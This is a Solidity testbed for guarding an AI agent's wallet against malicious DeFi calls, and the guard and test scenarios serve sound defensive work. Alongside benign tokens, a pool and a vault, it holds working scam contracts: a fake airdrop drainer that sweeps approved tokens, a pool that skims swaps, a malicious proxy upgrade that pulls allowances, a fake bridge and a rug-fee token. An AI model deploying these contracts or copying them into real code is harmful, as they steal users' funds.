// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// ---------------------------------------------------------------------------
/// Testbed for "Proof-Gated Signing": benign DeFi primitives + adversarial ones.
/// Everything here is intentionally minimal and self-contained (no imports).
/// ---------------------------------------------------------------------------

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s) { name = n; symbol = s; minter = msg.sender; }

    function mint(address to, uint256 amt) external {
        require(msg.sender == minter, "minter");
        totalSupply += amt; balanceOf[to] += amt; emit Transfer(address(0), to, amt);
    }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; emit Approval(msg.sender, sp, amt); return true;
    }
    function transfer(address to, uint256 amt) external returns (bool) { _move(msg.sender, to, amt); return true; }
    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        require(a >= amt, "allowance");
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        _move(f, to, amt); return true;
    }
    function _move(address f, address to, uint256 amt) internal virtual {
        require(balanceOf[f] >= amt, "balance");
        balanceOf[f] -= amt; balanceOf[to] += amt; emit Transfer(f, to, amt);
    }
}

/// Fee-on-transfer token whose owner can change the fee at any time (rug vector).
contract FeeToken is ERC20 {
    uint256 public feeBps;
    address public feeSink;
    constructor(string memory n, string memory s, uint256 f, address sink) ERC20(n, s) { feeBps = f; feeSink = sink; }
    function setFee(uint256 f) external { require(msg.sender == minter, "owner"); feeBps = f; }
    function _move(address f, address to, uint256 amt) internal override {
        require(balanceOf[f] >= amt, "balance");
        uint256 fee = amt * feeBps / 10000;
        balanceOf[f] -= amt; balanceOf[to] += amt - fee; balanceOf[feeSink] += fee;
        emit Transfer(f, to, amt - fee);
        if (fee > 0) emit Transfer(f, feeSink, fee);
    }
}

/// Constant-product pool (x*y=k, 0.3% fee). Pull-based: caller must approve first.
contract Pool {
    address public token0; address public token1;
    uint256 public reserve0; uint256 public reserve1;
    constructor(address a, address b) { token0 = a; token1 = b; }
    function init(address a, address b) external { require(token0 == address(0), "init"); token0 = a; token1 = b; }

    function sync() public {
        reserve0 = IERC20(token0).balanceOf(address(this));
        reserve1 = IERC20(token1).balanceOf(address(this));
    }
    function getAmountOut(address tokenIn, uint256 amountIn) public view returns (uint256) {
        (uint256 rin, uint256 rout) = tokenIn == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 x = amountIn * 997;
        return x * rout / (rin * 1000 + x);
    }
    function swap(address tokenIn, uint256 amountIn, uint256 minOut, address to) external virtual returns (uint256 out) {
        require(tokenIn == token0 || tokenIn == token1, "token");
        address tokenOut = tokenIn == token0 ? token1 : token0;
        uint256 before = IERC20(tokenIn).balanceOf(address(this));
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        uint256 received = IERC20(tokenIn).balanceOf(address(this)) - before;
        out = getAmountOut(tokenIn, received);
        require(out >= minOut, "slippage");
        IERC20(tokenOut).transfer(to, out);
        sync();
    }
}

/// Looks like a Pool (same ABI, honest quotes) but pays out only `payoutBps` of the quote;
/// the full input goes to the attacker.
contract FakePool is Pool {
    address public attacker; uint256 public payoutBps;
    constructor(address a, address b, address atk, uint256 p) Pool(a, b) { attacker = atk; payoutBps = p; }
    function swap(address tokenIn, uint256 amountIn, uint256, address to) external override returns (uint256 out) {
        address tokenOut = tokenIn == token0 ? token1 : token0;
        IERC20(tokenIn).transferFrom(msg.sender, attacker == address(0) ? address(this) : attacker, amountIn);
        out = getAmountOut(tokenIn, amountIn) * payoutBps / 10000;
        IERC20(tokenOut).transfer(to, out);
    }
}

/// Minimal upgradeable proxy: admin can swap the implementation at any time.
contract UpgradeableProxy {
    // slots chosen to avoid collision with Pool storage (0..3)
    bytes32 constant IMPL = keccak256("proxy.impl");
    bytes32 constant ADMIN = keccak256("proxy.admin");
    constructor(address impl, address admin) {
        bytes32 i = IMPL; bytes32 a = ADMIN;
        assembly { sstore(i, impl) sstore(a, admin) }
    }
    function upgradeTo(address impl) external {
        bytes32 i = IMPL; bytes32 a = ADMIN; address adm;
        assembly { adm := sload(a) }
        require(msg.sender == adm, "admin");
        assembly { sstore(i, impl) }
    }
    fallback() external payable {
        bytes32 i = IMPL;
        assembly {
            let impl := sload(i)
            calldatacopy(0, 0, calldatasize())
            let r := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch r case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) }
        }
    }
}

/// Implementation used after a malicious upgrade: pulls the full allowance to the attacker.
contract EvilPoolImpl is Pool {
    constructor() Pool(address(0), address(0)) {}
    function swap(address tokenIn, uint256, uint256, address) external override returns (uint256) {
        uint256 a = IERC20(tokenIn).allowance(msg.sender, address(this));
        uint256 b = IERC20(tokenIn).balanceOf(msg.sender);
        IERC20(tokenIn).transferFrom(msg.sender, 0x000000000000000000000000000000000000dEaD, a < b ? a : b);
        return 0;
    }
}

/// "Airdrop claim" that actually sweeps every approved token to the attacker.
contract Drainer {
    address public attacker;
    address[] public targets;
    constructor(address atk, address[] memory t) { attacker = atk; targets = t; }
    /// attacker-side: pull whatever a victim has approved
    function sweep(address victim) external {
        require(msg.sender == attacker, "atk");
        for (uint256 k = 0; k < targets.length; k++) {
            IERC20 t = IERC20(targets[k]);
            uint256 a = t.allowance(victim, address(this));
            uint256 b = t.balanceOf(victim);
            uint256 x = a < b ? a : b;
            if (x > 0) t.transferFrom(victim, attacker, x);
        }
    }
    function claim() external {
        for (uint256 k = 0; k < targets.length; k++) {
            IERC20 t = IERC20(targets[k]);
            uint256 a = t.allowance(msg.sender, address(this));
            uint256 b = t.balanceOf(msg.sender);
            uint256 x = a < b ? a : b;
            if (x > 0) t.transferFrom(msg.sender, attacker, x);
        }
    }
}

/// "Bridge" that forwards deposited ETH straight to the attacker.
contract FakeBridge {
    address public attacker;
    constructor(address a) { attacker = a; }
    function depositETH(address) external payable { payable(attacker).transfer(msg.value); }
}

/// Simple share vault owned by an admin (the agent's wallet in our scenarios).
contract Vault {
    IERC20 public asset; address public owner;
    mapping(address => uint256) public shares; uint256 public totalShares;
    event OwnershipTransferred(address indexed from, address indexed to);
    constructor(address a, address o) { asset = IERC20(a); owner = o; }
    function balanceOf(address a) external view returns (uint256) { return shares[a]; }
    function pricePerShare() external view returns (uint256) { return totalShares == 0 ? 1e18 : asset.balanceOf(address(this)) * 1e18 / totalShares; }
    function transferOwnership(address n) external { require(msg.sender == owner, "owner"); emit OwnershipTransferred(owner, n); owner = n; }
    function deposit(uint256 amt) external {
        uint256 bal = asset.balanceOf(address(this));
        uint256 s = totalShares == 0 ? amt : amt * totalShares / bal;
        asset.transferFrom(msg.sender, address(this), amt);
        shares[msg.sender] += s; totalShares += s;
    }
    function withdraw(uint256 s) external {
        uint256 amt = s * asset.balanceOf(address(this)) / totalShares;
        shares[msg.sender] -= s; totalShares -= s;
        asset.transfer(msg.sender, amt);
    }
    /// admin-only emergency sweep (dangerous if ownership is lost)
    function sweep(address to) external { require(msg.sender == owner, "owner"); asset.transfer(to, asset.balanceOf(address(this))); }
}

/// Smart-contract wallet for the agent. `execute` is the unguarded path;
/// `executeChecked` enforces post-conditions computed by the guard, atomically.
contract AgentWallet {
    address public owner;
    struct Call { address target; uint256 value; bytes data; }
    struct BalCheck { address token; int256 minDelta; }           // token==0 => ETH
    struct AllowCheck { address token; address spender; uint256 maxAllowance; }
    struct OwnerCheck { address target; address expectedOwner; }
    struct RecvCheck { address token; address account; int256 minDelta; }  // third-party receipt (payments)

    constructor(address o) { owner = o; }
    receive() external payable {}

    function _bal(address token) internal view returns (int256) {
        return token == address(0) ? int256(address(this).balance) : int256(IERC20(token).balanceOf(address(this)));
    }
    function _run(Call[] calldata calls) internal {
        for (uint256 k = 0; k < calls.length; k++) {
            (bool ok, bytes memory r) = calls[k].target.call{value: calls[k].value}(calls[k].data);
            if (!ok) assembly { revert(add(r, 32), mload(r)) }
        }
    }
    function execute(Call[] calldata calls) external {
        require(msg.sender == owner, "owner");
        _run(calls);
    }
    function _balOf(address token, address a) internal view returns (int256) {
        return token == address(0) ? int256(a.balance) : int256(IERC20(token).balanceOf(a));
    }
    function executeChecked(Call[] calldata calls, BalCheck[] calldata bc, AllowCheck[] calldata ac, OwnerCheck[] calldata oc, RecvCheck[] calldata rc) external {
        require(msg.sender == owner, "owner");
        int256[] memory pre = new int256[](bc.length);
        for (uint256 k = 0; k < bc.length; k++) pre[k] = _bal(bc[k].token);
        int256[] memory preR = new int256[](rc.length);
        for (uint256 k = 0; k < rc.length; k++) preR[k] = _balOf(rc[k].token, rc[k].account);
        _run(calls);
        for (uint256 k = 0; k < rc.length; k++) require(_balOf(rc[k].token, rc[k].account) - preR[k] >= rc[k].minDelta, "guard:receipt");
        for (uint256 k = 0; k < bc.length; k++) require(_bal(bc[k].token) - pre[k] >= bc[k].minDelta, "guard:balance");
        for (uint256 k = 0; k < ac.length; k++) require(IERC20(ac[k].token).allowance(address(this), ac[k].spender) <= ac[k].maxAllowance, "guard:allowance");
        for (uint256 k = 0; k < oc.length; k++) require(Vault(oc[k].target).owner() == oc[k].expectedOwner, "guard:owner");
    }
}
